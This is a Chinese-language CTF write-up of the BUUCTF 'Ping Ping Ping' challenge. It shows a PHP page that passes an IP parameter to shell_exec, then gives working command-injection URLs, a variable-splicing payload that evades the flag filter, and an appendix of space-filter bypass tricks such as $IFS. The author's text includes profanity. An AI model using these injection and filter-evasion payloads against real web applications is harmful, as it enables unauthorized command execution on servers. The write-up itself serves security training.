---
title: CTF之PHP命令执行
date: 2025-11-20 08:48:21
tags: [CTF, PHP, 命令执行, 渗透测试]
---

# PHP命令执行

## 题目：BUUCTF Ping Ping Ping

## 解题思路

打开网页看到

```
/?ip=
```

可以看到直接GET请求一个IP，尝试

```
http://target/?ip=127.1
```

返回

```
PING 127.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.031 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.083 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.056 ms
64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.083 ms

--- 127.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 0.031/0.063/0.083 ms
```

访问

```
http://target/?ip=127.1;ls
```

```
/?ip=

PING 127.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.037 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.050 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.062 ms
64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.068 ms

--- 127.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 0.037/0.054/0.068 ms
flag.php
index.php
```

可以看到目录下存在`flag.php`，傻子都知道肯定不可以直接访问flag.php，尝试使用`cat`命令查看之，返回

```
/?ip= fxck your flag!
```

fuck尼玛！！！fuck you and fuck all of you

接下来尝试使用通配符`*`，返回：

```
/?ip= 1fxck your symbol!
```

此时才想到先去看一下`index.php`，访问

```
http://target/?ip=127.1;cat$IFS$1index.php
```

得到`index.php`内容:

```php
/?ip=

PING 127.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.030 ms
64 bytes from 127.0.0.1: seq=1 ttl=42 time=0.049 ms
64 bytes from 127.0.0.1: seq=2 ttl=42 time=0.046 ms
64 bytes from 127.0.0.1: seq=3 ttl=42 time=0.049 ms

--- 127.1 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 0.030/0.043/0.049 ms
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "

";
  print_r($a);
}
```

可以看到过滤挺全面哈。

此时可以考虑定义一个变量`a=ag`，然后构造payload：

```
http://target/?ip=127.1;a=ag;cat$IFS$1fl$a.php
```

这次它终于不fuck了，在注释中找到flag

```php
$flag = "flag{ab6f245f-d55b-4d67-8cfb-ddf937f0bd48}";
```

## 附录：过滤空格方法

```bash
$IFS
${IFS}
$IFS$1
<
<>
{cat,flag.php}
%20
%09
```